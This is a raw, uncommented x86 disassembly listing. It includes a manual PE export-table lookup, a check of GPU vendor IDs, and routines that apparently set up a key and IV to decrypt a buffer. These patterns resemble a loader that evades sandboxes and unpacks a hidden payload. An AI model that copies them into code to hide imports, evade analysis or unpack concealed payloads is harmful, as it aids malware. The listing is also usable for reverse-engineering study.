  4041c7:	8d 04 8f             	lea    (%edi,%ecx,4),%eax
  4041ca:	8b 4c 24 20          	mov    0x20(%esp),%ecx
  4041ce:	e9 85 00 00 00       	jmp    0x404258
  4041d3:	8b 6c 32 18          	mov    0x18(%edx,%esi,1),%ebp
  4041d7:	89 34 24             	mov    %esi,(%esp)
  4041da:	8b 4c 32 20          	mov    0x20(%edx,%esi,1),%ecx
  4041de:	01 d1                	add    %edx,%ecx
  4041e0:	89 4c 24 04          	mov    %ecx,0x4(%esp)
  4041e4:	31 ff                	xor    %edi,%edi
  4041e6:	66 2e 0f 1f 84 00 00 	nopw   %cs:0x0(%eax,%eax,1)
  4041ed:	00 00 00 
  4041f0:	4d                   	dec    %ebp
  4041f1:	89 6c 24 08          	mov    %ebp,0x8(%esp)
  4041f5:	eb 10                	jmp    0x404207
  4041f7:	66 0f 1f 84 00 00 00 	nopw   0x0(%eax,%eax,1)
  4041fe:	00 00 
  404200:	45                   	inc    %ebp
  404201:	89 ef                	mov    %ebp,%edi
  404203:	89 da                	mov    %ebx,%edx
  404205:	89 f0                	mov    %esi,%eax
  404207:	8b 4c 24 08          	mov    0x8(%esp),%ecx
  40420b:	8d 2c 39             	lea    (%ecx,%edi,1),%ebp
  40420e:	d1 ed                	shr    $1,%ebp
  404210:	8b 4c 24 04          	mov    0x4(%esp),%ecx
  404214:	8b 0c a9             	mov    (%ecx,%ebp,4),%ecx
  404217:	89 d3                	mov    %edx,%ebx
  404219:	01 d1                	add    %edx,%ecx
  40421b:	83 ec 08             	sub    $0x8,%esp
  40421e:	89 c6                	mov    %eax,%esi
  404220:	50                   	push   %eax
  404221:	51                   	push   %ecx
  404222:	e8 1d d9 00 00       	call   0x411b44
  404227:	83 c4 10             	add    $0x10,%esp
  40422a:	85 c0                	test   %eax,%eax
  40422c:	78 d2                	js     0x404200
  40422e:	89 da                	mov    %ebx,%edx
  404230:	89 f0                	mov    %esi,%eax
  404232:	75 bc                	jne    0x4041f0
  404234:	8b 0c 24             	mov    (%esp),%ecx
  404237:	8b 44 0a 24          	mov    0x24(%edx,%ecx,1),%eax
  40423b:	01 d0                	add    %edx,%eax
  40423d:	8b 4c 0a 1c          	mov    0x1c(%edx,%ecx,1),%ecx
  404241:	01 d1                	add    %edx,%ecx
  404243:	0f b7 04 68          	movzwl (%eax,%ebp,2),%eax
  404247:	8d 04 81             	lea    (%ecx,%eax,4),%eax
  40424a:	8b 7c 24 20          	mov    0x20(%esp),%edi
  40424e:	89 f9                	mov    %edi,%ecx
  404250:	8b 5c 24 24          	mov    0x24(%esp),%ebx
  404254:	8b 6c 24 28          	mov    0x28(%esp),%ebp
  404258:	03 10                	add    (%eax),%edx
  40425a:	83 ec 08             	sub    $0x8,%esp
  40425d:	ff 74 24 3c          	push   0x3c(%esp)
  404261:	ff 74 24 3c          	push   0x3c(%esp)
  404265:	ff 74 24 3c          	push   0x3c(%esp)
  404269:	55                   	push   %ebp
  40426a:	53                   	push   %ebx
  40426b:	51                   	push   %ecx
  40426c:	ff d2                	call   *%edx
  40426e:	83 c4 14             	add    $0x14,%esp
  404271:	5e                   	pop    %esi
  404272:	5f                   	pop    %edi
  404273:	5b                   	pop    %ebx
  404274:	5d                   	pop    %ebp
  404275:	c3                   	ret
  404276:	90                   	nop
  404277:	90                   	nop
  404278:	55                   	push   %ebp
  404279:	53                   	push   %ebx
  40427a:	57                   	push   %edi
  40427b:	56                   	push   %esi
  40427c:	81 ec 6c 04 00 00    	sub    $0x46c,%esp
  404282:	8b 3d 24 5e 71 00    	mov    0x715e24,%edi
  404288:	85 ff                	test   %edi,%edi
  40428a:	74 30                	je     0x4042bc
  40428c:	e8 77 eb ff ff       	call   0x402e08
  404291:	8b 4f 3c             	mov    0x3c(%edi),%ecx
  404294:	8b 54 0f 78          	mov    0x78(%edi,%ecx,1),%edx
  404298:	3d ff ff 00 00       	cmp    $0xffff,%eax
  40429d:	77 24                	ja     0x4042c3
  40429f:	8b 74 17 1c          	mov    0x1c(%edi,%edx,1),%esi
  4042a3:	01 fe                	add    %edi,%esi
  4042a5:	0f b7 c8             	movzwl %ax,%ecx
  4042a8:	2b 4c 17 10          	sub    0x10(%edi,%edx,1),%ecx
  4042ac:	8d 04 8e             	lea    (%esi,%ecx,4),%eax
  4042af:	03 38                	add    (%eax),%edi
  4042b1:	0f 85 94 00 00 00    	jne    0x40434b
  4042b7:	e9 0b 01 00 00       	jmp    0x4043c7
  4042bc:	31 db                	xor    %ebx,%ebx
  4042be:	e9 25 01 00 00       	jmp    0x4043e8
  4042c3:	8b 6c 17 18          	mov    0x18(%edi,%edx,1),%ebp
  4042c7:	4d                   	dec    %ebp
  4042c8:	89 54 24 18          	mov    %edx,0x18(%esp)
  4042cc:	8b 4c 17 20          	mov    0x20(%edi,%edx,1),%ecx
  4042d0:	01 f9                	add    %edi,%ecx
  4042d2:	89 4c 24 1c          	mov    %ecx,0x1c(%esp)
  4042d6:	31 db                	xor    %ebx,%ebx
  4042d8:	89 7c 24 14          	mov    %edi,0x14(%esp)
  4042dc:	66 66 66 2e 0f 1f 84 	data16 data16 nopw %cs:0x0(%eax,%eax,1)
  4042e3:	00 00 00 00 00 
  4042e8:	8d 34 2b             	lea    (%ebx,%ebp,1),%esi
  4042eb:	d1 ee                	shr    $1,%esi
  4042ed:	8b 4c 24 1c          	mov    0x1c(%esp),%ecx
  4042f1:	8b 0c b1             	mov    (%ecx,%esi,4),%ecx
  4042f4:	01 f9                	add    %edi,%ecx
  4042f6:	89 c7                	mov    %eax,%edi
  4042f8:	89 44 24 04          	mov    %eax,0x4(%esp)
  4042fc:	89 0c 24             	mov    %ecx,(%esp)
  4042ff:	e8 40 d8 00 00       	call   0x411b44
  404304:	85 c0                	test   %eax,%eax
  404306:	79 10                	jns    0x404318
  404308:	46                   	inc    %esi
  404309:	89 f3                	mov    %esi,%ebx
  40430b:	eb 10                	jmp    0x40431d
  40430d:	66 66 2e 0f 1f 84 00 	data16 nopw %cs:0x0(%eax,%eax,1)
  404314:	00 00 00 00 
  404318:	74 12                	je     0x40432c
  40431a:	4e                   	dec    %esi
  40431b:	89 f5                	mov    %esi,%ebp
  40431d:	89 f8                	mov    %edi,%eax
  40431f:	8b 7c 24 14          	mov    0x14(%esp),%edi
  404323:	39 eb                	cmp    %ebp,%ebx
  404325:	76 c1                	jbe    0x4042e8
  404327:	e9 9b 00 00 00       	jmp    0x4043c7
  40432c:	8b 4c 24 18          	mov    0x18(%esp),%ecx
  404330:	8b 7c 24 14          	mov    0x14(%esp),%edi
  404334:	8b 44 0f 24          	mov    0x24(%edi,%ecx,1),%eax
  404338:	01 f8                	add    %edi,%eax
  40433a:	8b 4c 0f 1c          	mov    0x1c(%edi,%ecx,1),%ecx
  40433e:	01 f9                	add    %edi,%ecx
  404340:	0f b7 04 70          	movzwl (%eax,%esi,2),%eax
  404344:	8d 04 81             	lea    (%ecx,%eax,4),%eax
  404347:	03 38                	add    (%eax),%edi
  404349:	74 7c                	je     0x4043c7
  40434b:	c7 04 24 20 00 00 00 	movl   $0x20,(%esp)
  404352:	ff d7                	call   *%edi
  404354:	83 ec 04             	sub    $0x4,%esp
  404357:	89 c6                	mov    %eax,%esi
  404359:	85 f6                	test   %esi,%esi
  40435b:	74 6a                	je     0x4043c7
  40435d:	8b 06                	mov    (%esi),%eax
  40435f:	89 34 24             	mov    %esi,(%esp)
  404362:	ff 50 10             	call   *0x10(%eax)
  404365:	83 ec 04             	sub    $0x4,%esp
  404368:	85 c0                	test   %eax,%eax
  40436a:	74 57                	je     0x4043c3
  40436c:	31 ff                	xor    %edi,%edi
  40436e:	8d 5c 24 20          	lea    0x20(%esp),%ebx
  404372:	66 0f 1f 44 00 00    	nopw   0x0(%eax,%eax,1)
  404378:	8b 06                	mov    (%esi),%eax
  40437a:	89 5c 24 0c          	mov    %ebx,0xc(%esp)
  40437e:	89 7c 24 04          	mov    %edi,0x4(%esp)
  404382:	89 34 24             	mov    %esi,(%esp)
  404385:	c7 44 24 08 00 00 00 	movl   $0x0,0x8(%esp)
  40438c:	00 
  40438d:	ff 50 14             	call   *0x14(%eax)
  404390:	83 ec 10             	sub    $0x10,%esp
  404393:	85 c0                	test   %eax,%eax
  404395:	78 1c                	js     0x4043b3
  404397:	8b 84 24 48 04 00 00 	mov    0x448(%esp),%eax
  40439e:	3d 02 10 00 00       	cmp    $0x1002,%eax
  4043a3:	74 26                	je     0x4043cb
  4043a5:	3d 86 80 00 00       	cmp    $0x8086,%eax
  4043aa:	74 1f                	je     0x4043cb
  4043ac:	3d de 10 00 00       	cmp    $0x10de,%eax
  4043b1:	74 18                	je     0x4043cb
  4043b3:	47                   	inc    %edi
  4043b4:	8b 06                	mov    (%esi),%eax
  4043b6:	89 34 24             	mov    %esi,(%esp)
  4043b9:	ff 50 10             	call   *0x10(%eax)
  4043bc:	83 ec 04             	sub    $0x4,%esp
  4043bf:	39 c7                	cmp    %eax,%edi
  4043c1:	72 b5                	jb     0x404378
  4043c3:	31 db                	xor    %ebx,%ebx
  4043c5:	eb 06                	jmp    0x4043cd
  4043c7:	31 db                	xor    %ebx,%ebx
  4043c9:	eb 0d                	jmp    0x4043d8
  4043cb:	b3 01                	mov    $0x1,%bl
  4043cd:	8b 06                	mov    (%esi),%eax
  4043cf:	89 34 24             	mov    %esi,(%esp)
  4043d2:	ff 50 08             	call   *0x8(%eax)
  4043d5:	83 ec 04             	sub    $0x4,%esp
  4043d8:	a1 24 5e 71 00       	mov    0x715e24,%eax
  4043dd:	89 04 24             	mov    %eax,(%esp)
  4043e0:	e8 8d ce 01 00       	call   0x421272
  4043e5:	83 ec 04             	sub    $0x4,%esp
  4043e8:	89 d8                	mov    %ebx,%eax
  4043ea:	81 c4 6c 04 00 00    	add    $0x46c,%esp
  4043f0:	5e                   	pop    %esi
  4043f1:	5f                   	pop    %edi
  4043f2:	5b                   	pop    %ebx
  4043f3:	5d                   	pop    %ebp
  4043f4:	c3                   	ret
  4043f5:	90                   	nop
  4043f6:	90                   	nop
  4043f7:	90                   	nop
  4043f8:	55                   	push   %ebp
  4043f9:	53                   	push   %ebx
  4043fa:	57                   	push   %edi
  4043fb:	56                   	push   %esi
  4043fc:	83 ec 2c             	sub    $0x2c,%esp
  4043ff:	c7 44 24 08 00 00 00 	movl   $0x0,0x8(%esp)
  404406:	00 
  404407:	c7 44 24 04 00 00 00 	movl   $0x0,0x4(%esp)
  40440e:	00 
  40440f:	8d 44 24 08          	lea    0x8(%esp),%eax
  404413:	6a 00                	push   $0x0
  404415:	6a 00                	push   $0x0
  404417:	68 c8 24 42 00       	push   $0x4224c8
  40441c:	50                   	push   %eax
  40441d:	e8 e2 cf 01 00       	call   0x421404
  404422:	85 c0                	test   %eax,%eax
  404424:	0f 88 c1 00 00 00    	js     0x4044eb
  40442a:	83 ec 04             	sub    $0x4,%esp
  40442d:	8d 44 24 08          	lea    0x8(%esp),%eax
  404431:	6a 00                	push   $0x0
  404433:	6a 00                	push   $0x0
  404435:	6a 00                	push   $0x0
  404437:	6a 00                	push   $0x0
  404439:	6a 00                	push   $0x0
  40443b:	50                   	push   %eax
  40443c:	ff 74 24 24          	push   0x24(%esp)
  404440:	e8 95 cf 01 00       	call   0x4213da
  404445:	83 c4 04             	add    $0x4,%esp
  404448:	85 c0                	test   %eax,%eax
  40444a:	0f 88 a8 00 00 00    	js     0x4044f8
  404450:	8b 4c 24 40          	mov    0x40(%esp),%ecx
  404454:	8b 44 24 04          	mov    0x4(%esp),%eax
  404458:	83 79 18 0f          	cmpl   $0xf,0x18(%ecx)
  40445c:	8b 51 14             	mov    0x14(%ecx),%edx
  40445f:	77 05                	ja     0x404466
  404461:	83 c1 04             	add    $0x4,%ecx
  404464:	eb 03                	jmp    0x404469
  404466:	8b 49 04             	mov    0x4(%ecx),%ecx
  404469:	6a 00                	push   $0x0
  40446b:	52                   	push   %edx
  40446c:	51                   	push   %ecx
  40446d:	50                   	push   %eax
  40446e:	e8 8b cf 01 00       	call   0x4213fe
  404473:	85 c0                	test   %eax,%eax
  404475:	0f 88 9b 00 00 00    	js     0x404516
  40447b:	8d 7c 24 0c          	lea    0xc(%esp),%edi
  40447f:	6a 00                	push   $0x0
  404481:	6a 20                	push   $0x20
  404483:	57                   	push   %edi
  404484:	ff 74 24 10          	push   0x10(%esp)
  404488:	e8 65 cf 01 00       	call   0x4213f2
  40448d:	89 c6                	mov    %eax,%esi
  40448f:	83 ec 0c             	sub    $0xc,%esp
  404492:	ff 74 24 10          	push   0x10(%esp)
  404496:	e8 4b cf 01 00       	call   0x4213e6
  40449b:	83 c4 0c             	add    $0xc,%esp
  40449e:	83 ec 08             	sub    $0x8,%esp
  4044a1:	6a 00                	push   $0x0
  4044a3:	ff 74 24 14          	push   0x14(%esp)
  4044a7:	e8 28 cf 01 00       	call   0x4213d4
  4044ac:	83 c4 08             	add    $0x8,%esp
  4044af:	85 f6                	test   %esi,%esi
  4044b1:	0f 88 8c 00 00 00    	js     0x404543
  4044b7:	8b 74 24 50          	mov    0x50(%esp),%esi
  4044bb:	8b 5c 24 4c          	mov    0x4c(%esp),%ebx
  4044bf:	8b 6c 24 48          	mov    0x48(%esp),%ebp
  4044c3:	83 ec 04             	sub    $0x4,%esp
  4044c6:	55                   	push   %ebp
  4044c7:	57                   	push   %edi
  4044c8:	ff 74 24 50          	push   0x50(%esp)
  4044cc:	e8 df d3 00 00       	call   0x4118b0
  4044d1:	83 c4 10             	add    $0x10,%esp
  4044d4:	8d 44 2c 0c          	lea    0xc(%esp,%ebp,1),%eax
  4044d8:	83 ec 04             	sub    $0x4,%esp
  4044db:	56                   	push   %esi
  4044dc:	50                   	push   %eax
  4044dd:	53                   	push   %ebx
  4044de:	e8 cd d3 00 00       	call   0x4118b0
  4044e3:	83 c4 3c             	add    $0x3c,%esp
  4044e6:	5e                   	pop    %esi
  4044e7:	5f                   	pop    %edi
  4044e8:	5b                   	pop    %ebx
  4044e9:	5d                   	pop    %ebp
  4044ea:	c3                   	ret
  4044eb:	83 ec 0c             	sub    $0xc,%esp
  4044ee:	6a 01                	push   $0x1
  4044f0:	e8 4f 88 01 00       	call   0x41cd44
  4044f5:	83 c4 0c             	add    $0xc,%esp
  4044f8:	83 ec 08             	sub    $0x8,%esp
  4044fb:	6a 00                	push   $0x0
  4044fd:	ff 74 24 14          	push   0x14(%esp)
  404501:	e8 ce ce 01 00       	call   0x4213d4
  404506:	83 c4 08             	add    $0x8,%esp
  404509:	83 ec 0c             	sub    $0xc,%esp
  40450c:	6a 01                	push   $0x1
  40450e:	e8 31 88 01 00       	call   0x41cd44
  404513:	83 c4 0c             	add    $0xc,%esp
  404516:	83 ec 0c             	sub    $0xc,%esp
  404519:	ff 74 24 10          	push   0x10(%esp)
  40451d:	e8 c4 ce 01 00       	call   0x4213e6
  404522:	83 c4 0c             	add    $0xc,%esp
  404525:	83 ec 08             	sub    $0x8,%esp
  404528:	6a 00                	push   $0x0
  40452a:	ff 74 24 14          	push   0x14(%esp)
  40452e:	e8 a1 ce 01 00       	call   0x4213d4
  404533:	83 c4 08             	add    $0x8,%esp
  404536:	83 ec 0c             	sub    $0xc,%esp
  404539:	6a 01                	push   $0x1
  40453b:	e8 04 88 01 00       	call   0x41cd44
  404540:	83 c4 0c             	add    $0xc,%esp
  404543:	83 ec 0c             	sub    $0xc,%esp
  404546:	6a 01                	push   $0x1
  404548:	e8 f7 87 01 00       	call   0x41cd44
  40454d:	83 c4 0c             	add    $0xc,%esp
  404550:	55                   	push   %ebp
  404551:	89 e5                	mov    %esp,%ebp
  404553:	53                   	push   %ebx
  404554:	57                   	push   %edi
  404555:	56                   	push   %esi
  404556:	81 ec 8c 00 00 00    	sub    $0x8c,%esp
  40455c:	8b 4d 08             	mov    0x8(%ebp),%ecx
  40455f:	8b 45 10             	mov    0x10(%ebp),%eax
  404562:	89 4d f0             	mov    %ecx,-0x10(%ebp)
  404565:	c7 45 ec 00 00 00 00 	movl   $0x0,-0x14(%ebp)
  40456c:	c7 45 e8 00 00 00 00 	movl   $0x0,-0x18(%ebp)
  404573:	83 ec 0c             	sub    $0xc,%esp
  404576:	8d 4d 94             	lea    -0x6c(%ebp),%ecx
  404579:	8d 9d 74 ff ff ff    	lea    -0x8c(%ebp),%ebx
  40457f:	6a 10                	push   $0x10
  404581:	51                   	push   %ecx
  404582:	6a 20                	push   $0x20
  404584:	53                   	push   %ebx
  404585:	50                   	push   %eax
  404586:	e8 6d fe ff ff       	call   0x4043f8
  40458b:	83 c4 20             	add    $0x20,%esp
  40458e:	8d 45 ec             	lea    -0x14(%ebp),%eax
  404591:	6a 00                	push   $0x0
  404593:	6a 00                	push   $0x0
  404595:	68 d6 24 42 00       	push   $0x4224d6
  40459a:	50                   	push   %eax
  40459b:	e8 64 ce 01 00       	call   0x421404
  4045a0:	83 ec 0c             	sub    $0xc,%esp
  4045a3:	6a 00                	push   $0x0
  4045a5:	6a 20                	push   $0x20
  4045a7:	68 f8 24 42 00       	push   $0x4224f8
  4045ac:	68 de 24 42 00       	push   $0x4224de
  4045b1:	ff 75 ec             	push   -0x14(%ebp)
  4045b4:	e8 51 ce 01 00       	call   0x42140a
  4045b9:	83 c4 0c             	add    $0xc,%esp
  4045bc:	89 c6                	mov    %eax,%esi
  4045be:	c7 45 c0 ec 04 42 00 	movl   $0x4204ec,-0x40(%ebp)
  4045c5:	c7 45 c4 cc 26 42 00 	movl   $0x4226cc,-0x3c(%ebp)
  4045cc:	89 6d c8             	mov    %ebp,-0x38(%ebp)
  4045cf:	89 65 d0             	mov    %esp,-0x30(%ebp)
  4045d2:	c7 45 c8 67 48 40 00 	movl   $0x404867,-0x38(%ebp)
  4045d9:	8d 45 a4             	lea    -0x5c(%ebp),%eax
  4045dc:	e8 74 cb 01 00       	call   0x421155
  4045e1:	85 f6                	test   %esi,%esi
  4045e3:	79 18                	jns    0x4045fd
  4045e5:	8b 45 ec             	mov    -0x14(%ebp),%eax
  4045e8:	c7 45 ac ff ff ff ff 	movl   $0xffffffff,-0x54(%ebp)
  4045ef:	83 ec 08             	sub    $0x8,%esp
  4045f2:	6a 00                	push   $0x0
  4045f4:	50                   	push   %eax
  4045f5:	e8 da cd 01 00       	call   0x4213d4
  4045fa:	83 c4 08             	add    $0x8,%esp
  4045fd:	8b 75 0c             	mov    0xc(%ebp),%esi
  404600:	8b 45 ec             	mov    -0x14(%ebp),%eax
  404603:	c7 45 ac ff ff ff ff 	movl   $0xffffffff,-0x54(%ebp)
  40460a:	83 ec 04             	sub    $0x4,%esp
  40460d:	8d 4d e8             	lea    -0x18(%ebp),%ecx
  404610:	6a 00                	push   $0x0
  404612:	6a 20                	push   $0x20
  404614:	53                   	push   %ebx
  404615:	6a 00                	push   $0x0
  404617:	6a 00                	push   $0x0
  404619:	51                   	push   %ecx
  40461a:	50                   	push   %eax
  40461b:	e8 d8 cd 01 00       	call   0x4213f8
  404620:	83 c4 04             	add    $0x4,%esp
  404623:	85 c0                	test   %eax,%eax
  404625:	79 18                	jns    0x40463f
  404627:	8b 45 ec             	mov    -0x14(%ebp),%eax
  40462a:	c7 45 ac ff ff ff ff 	movl   $0xffffffff,-0x54(%ebp)
  404631:	83 ec 08             	sub    $0x8,%esp
  404634:	6a 00                	push   $0x0
  404636:	50                   	push   %eax
  404637:	e8 98 cd 01 00       	call   0x4213d4
  40463c:	83 c4 08             	add    $0x8,%esp
  40463f:	8b 46 04             	mov    0x4(%esi),%eax
  404642:	8b 4e 08             	mov    0x8(%esi),%ecx
  404645:	8b 55 f0             	mov    -0x10(%ebp),%edx
  404648:	83 c2 04             	add    $0x4,%edx
  40464b:	89 cb                	mov    %ecx,%ebx
  40464d:	29 c3                	sub    %eax,%ebx
  40464f:	89 55 e0             	mov    %edx,-0x20(%ebp)
  404652:	8b 55 e0             	mov    -0x20(%ebp),%edx
  404655:	c7 42 08 00 00 00 00 	movl   $0x0,0x8(%edx)
  40465c:	c7 42 04 00 00 00 00 	movl   $0x0,0x4(%edx)
  404663:	c7 02 00 00 00 00    	movl   $0x0,(%edx)
  404669:	74 34                	je     0x40469f
  40466b:	81 fb 00 10 00 00    	cmp    $0x1000,%ebx
  404671:	72 32                	jb     0x4046a5
  404673:	83 fb dd             	cmp    $0xffffffdd,%ebx
  404676:	0f 83 c8 01 00 00    	jae    0x404844
  40467c:	8d 43 23             	lea    0x23(%ebx),%eax
  40467f:	c7 45 ac ff ff ff ff 	movl   $0xffffffff,-0x54(%ebp)
  404686:	83 ec 0c             	sub    $0xc,%esp
  404689:	50                   	push   %eax
  40468a:	e8 6d 63 00 00       	call   0x40a9fc
  40468f:	83 c4 10             	add    $0x10,%esp
  404692:	89 c1                	mov    %eax,%ecx
  404694:	8d 41 23             	lea    0x23(%ecx),%eax
  404697:	83 e0 e0             	and    $0xffffffe0,%eax
  40469a:	89 48 fc             	mov    %ecx,-0x4(%eax)
  40469d:	eb 19                	jmp    0x4046b8
  40469f:	31 db                	xor    %ebx,%ebx
  4046a1:	31 d2                	xor    %edx,%edx
  4046a3:	eb 4c                	jmp    0x4046f1
  4046a5:	c7 45 ac ff ff ff ff 	movl   $0xffffffff,-0x54(%ebp)
  4046ac:	83 ec 0c             	sub    $0xc,%esp
  4046af:	53                   	push   %ebx
  4046b0:	e8 47 63 00 00       	call   0x40a9fc
  4046b5:	83 c4 10             	add    $0x10,%esp
  4046b8:	8b 4d f0             	mov    -0x10(%ebp),%ecx
  4046bb:	89 41 04             	mov    %eax,0x4(%ecx)
  4046be:	8b 4d f0             	mov    -0x10(%ebp),%ecx
  4046c1:	89 41 08             	mov    %eax,0x8(%ecx)
  4046c4:	8d 0c 18             	lea    (%eax,%ebx,1),%ecx
  4046c7:	8b 55 f0             	mov    -0x10(%ebp),%edx
  4046ca:	89 4a 0c             	mov    %ecx,0xc(%edx)
  4046cd:	83 ec 04             	sub    $0x4,%esp
  4046d0:	53                   	push   %ebx
  4046d1:	6a 00                	push   $0x0
  4046d3:	50                   	push   %eax
  4046d4:	e8 a2 d3 00 00       	call   0x411a7b
  4046d9:	83 c4 10             	add    $0x10,%esp
  4046dc:	8b 45 f0             	mov    -0x10(%ebp),%eax
  4046df:	03 58 08             	add    0x8(%eax),%ebx
  4046e2:	89 58 08             	mov    %ebx,0x8(%eax)
  4046e5:	8b 46 04             	mov    0x4(%esi),%eax
  4046e8:	8b 4e 08             	mov    0x8(%esi),%ecx
  4046eb:	8b 55 f0             	mov    -0x10(%ebp),%edx
  4046ee:	8b 52 04             	mov    0x4(%edx),%edx
  4046f1:	8b 75 e8             	mov    -0x18(%ebp),%esi
  4046f4:	29 c1                	sub    %eax,%ecx
  4046f6:	29 d3                	sub    %edx,%ebx
  4046f8:	c7 45 ac 01 00 00 00 	movl   $0x1,-0x54(%ebp)
  4046ff:	83 ec 08             	sub    $0x8,%esp
  404702:	8d 7d dc             	lea    -0x24(%ebp),%edi
  404705:	6a 01                	push   $0x1
  404707:	57                   	push   %edi
  404708:	53                   	push   %ebx
  404709:	52                   	push   %edx
  40470a:	6a 10                	push   $0x10
  40470c:	8d 55 94             	lea    -0x6c(%ebp),%edx
  40470f:	52                   	push   %edx
  404710:	6a 00                	push   $0x0
  404712:	51                   	push   %ecx
  404713:	50                   	push   %eax
  404714:	56                   	push   %esi
  404715:	e8 c6 cc 01 00       	call   0x4213e0
  40471a:	83 c4 08             	add    $0x8,%esp
  40471d:	85 c0                	test   %eax,%eax
  40471f:	79 2e                	jns    0x40474f
  404721:	8b 45 e8             	mov    -0x18(%ebp),%eax
  404724:	c7 45 ac 02 00 00 00 	movl   $0x2,-0x54(%ebp)
  40472b:	83 ec 0c             	sub    $0xc,%esp
  40472e:	50                   	push   %eax
  40472f:	e8 b8 cc 01 00       	call   0x4213ec
  404734:	83 c4 0c             	add    $0xc,%esp
  404737:	8b 45 ec             	mov    -0x14(%ebp),%eax
  40473a:	c7 45 ac 03 00 00 00 	movl   $0x3,-0x54(%ebp)
  404741:	83 ec 08             	sub    $0x8,%esp
  404744:	6a 00                	push   $0x0
  404746:	50                   	push   %eax
  404747:	e8 88 cc 01 00       	call   0x4213d4
  40474c:	83 c4 08             	add    $0x8,%esp
  40474f:	8b 45 e8             	mov    -0x18(%ebp),%eax
  404752:	c7 45 ac 04 00 00 00 	movl   $0x4,-0x54(%ebp)
  404759:	83 ec 0c             	sub    $0xc,%esp
  40475c:	50                   	push   %eax
  40475d:	e8 8a cc 01 00       	call   0x4213ec
  404762:	83 c4 0c             	add    $0xc,%esp
  404765:	8b 45 ec             	mov    -0x14(%ebp),%eax
  404768:	c7 45 ac 05 00 00 00 	movl   $0x5,-0x54(%ebp)
  40476f:	83 ec 08             	sub    $0x8,%esp
  404772:	6a 00                	push   $0x0
  404774:	50                   	push   %eax
  404775:	e8 5a cc 01 00       	call   0x4213d4
  40477a:	83 c4 08             	add    $0x8,%esp
  40477d:	8b 55 dc             	mov    -0x24(%ebp),%edx
  404780:	8b 45 f0             	mov    -0x10(%ebp),%eax
  404783:	8b 40 08             	mov    0x8(%eax),%eax
  404786:	8b 4d f0             	mov    -0x10(%ebp),%ecx
  404789:	8b 49 04             	mov    0x4(%ecx),%ecx
  40478c:	89 c7                	mov    %eax,%edi
  40478e:	29 cf                	sub    %ecx,%edi
  404790:	89 d6                	mov    %edx,%esi
  404792:	29 fe                	sub    %edi,%esi
  404794:	73 09                	jae    0x40479f
  404796:	01 f0                	add    %esi,%eax
  404798:	89 c6                	mov    %eax,%esi
  40479a:	e9 82 00 00 00       	jmp    0x404821
  40479f:	0f 86 82 00 00 00    	jbe    0x404827
  4047a5:	89 55 e4             	mov    %edx,-0x1c(%ebp)
  4047a8:	8b 55 f0             	mov    -0x10(%ebp),%edx
  4047ab:	8b 52 0c             	mov    0xc(%edx),%edx
  4047ae:	89 d3                	mov    %edx,%ebx
  4047b0:	29 c3                	sub    %eax,%ebx
  4047b2:	39 f3                	cmp    %esi,%ebx
  4047b4:	73 4c                	jae    0x404802
  4047b6:	f7 d7                	not    %edi
  4047b8:	39 fe                	cmp    %edi,%esi
  4047ba:	8b 7d e4             	mov    -0x1c(%ebp),%edi
  4047bd:	0f 87 8d 00 00 00    	ja     0x404850
  4047c3:	29 ca                	sub    %ecx,%edx
  4047c5:	89 d0                	mov    %edx,%eax
  4047c7:	d1 e8                	shr    $1,%eax
  4047c9:	89 c6                	mov    %eax,%esi
  4047cb:	f7 d6                	not    %esi
  4047cd:	31 c9                	xor    %ecx,%ecx
  4047cf:	39 f2                	cmp    %esi,%edx
  4047d1:	77 04                	ja     0x4047d7
  4047d3:	01 d0                	add    %edx,%eax
  4047d5:	89 c1                	mov    %eax,%ecx
  4047d7:	39 f9                	cmp    %edi,%ecx
  4047d9:	89 f8                	mov    %edi,%eax
  4047db:	72 02                	jb     0x4047df
  4047dd:	89 c8                	mov    %ecx,%eax
  4047df:	8b 4d f0             	mov    -0x10(%ebp),%ecx
  4047e2:	c7 45 ac 07 00 00 00 	movl   $0x7,-0x54(%ebp)
  4047e9:	83 ec 08             	sub    $0x8,%esp
  4047ec:	50                   	push   %eax
  4047ed:	51                   	push   %ecx
  4047ee:	e8 21 0f 00 00       	call   0x405714
  4047f3:	83 c4 10             	add    $0x10,%esp
  4047f6:	8b 45 f0             	mov    -0x10(%ebp),%eax
  4047f9:	8b 40 08             	mov    0x8(%eax),%eax
  4047fc:	8b 4d f0             	mov    -0x10(%ebp),%ecx
  4047ff:	8b 49 04             	mov    0x4(%ecx),%ecx
  404802:	8b 75 e4             	mov    -0x1c(%ebp),%esi
  404805:	01 f1                	add    %esi,%ecx
  404807:	29 c1                	sub    %eax,%ecx
  404809:	83 ec 04             	sub    $0x4,%esp
  40480c:	51                   	push   %ecx
  40480d:	6a 00                	push   $0x0
  40480f:	50                   	push   %eax
  404810:	e8 66 d2 00 00       	call   0x411a7b
  404815:	83 c4 10             	add    $0x10,%esp
  404818:	8b 45 f0             	mov    -0x10(%ebp),%eax
  40481b:	8b 45 f0             	mov    -0x10(%ebp),%eax
  40481e:	03 70 04             	add    0x4(%eax),%esi
  404821:	8b 45 f0             	mov    -0x10(%ebp),%eax
  404824:	89 70 08             	mov    %esi,0x8(%eax)
  404827:	83 ec 0c             	sub    $0xc,%esp
  40482a:	8d 45 a4             	lea    -0x5c(%ebp),%eax
  40482d:	50                   	push   %eax
  40482e:	e8 43 c9 01 00       	call   0x421176
  404833:	83 c4 10             	add    $0x10,%esp
  404836:	8b 45 08             	mov    0x8(%ebp),%eax
  404839:	81 c4 8c 00 00 00    	add    $0x8c,%esp
  40483f:	5e                   	pop    %esi
  404840:	5f                   	pop    %edi
  404841:	5b                   	pop    %ebx
  404842:	5d                   	pop    %ebp
  404843:	c3                   	ret
  404844:	c7 45 ac ff ff ff ff 	movl   $0xffffffff,-0x54(%ebp)
  40484b:	e8 a4 9c 00 00       	call   0x40e4f4
  404850:	c7 45 ac 06 00 00 00 	movl   $0x6,-0x54(%ebp)
  404857:	83 ec 0c             	sub    $0xc,%esp
  40485a:	68 40 25 42 00       	push   $0x422540
  40485f:	e8 c8 9c 00 00       	call   0x40e52c
  404864:	83 c4 0c             	add    $0xc,%esp
  404867:	8b 45 a8             	mov    -0x58(%ebp),%eax
  40486a:	3d 07 00 00 00       	cmp    $0x7,%eax
  40486f:	76 02                	jbe    0x404873
  404871:	0f 0b                	ud2
  404873:	2d 01 00 00 00       	sub    $0x1,%eax
  404878:	ff 24 85 dc 48 40 00 	jmp    *0x4048dc(,%eax,4)
  40487f:	8b 75 b0             	mov    -0x50(%ebp),%esi
  404882:	8b 45 e0             	mov    -0x20(%ebp),%eax
  404885:	8b 00                	mov    (%eax),%eax
  404887:	85 c0                	test   %eax,%eax
